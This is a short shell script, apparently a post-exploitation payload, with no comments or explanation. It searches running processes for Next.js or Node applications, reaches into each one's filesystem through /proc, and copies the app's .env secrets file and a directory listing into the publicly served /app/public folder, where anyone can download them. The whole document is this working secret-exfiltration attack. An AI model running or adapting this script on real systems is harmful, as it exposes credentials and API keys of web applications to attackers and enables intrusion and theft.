#!/bin/sh
for f in /proc/[0-9]*/cmdline; do
  grep -qaE 'next|node' "$f" || continue
  p=${f#/proc/}; p=${p%%/*}
  R=/proc/$p/root
  [ -d "$R/app/public" ] || continue
  echo "$p" > "$R/app/public/zzpid.txt" 2>/dev/null || continue
  cat "$R/app/.env" > "$R/app/public/zzenv.txt" 2>/dev/null
  ls "$R/app" > "$R/app/public/zzls.txt" 2>/dev/null
  sleep 12
  exit
done
sleep 3
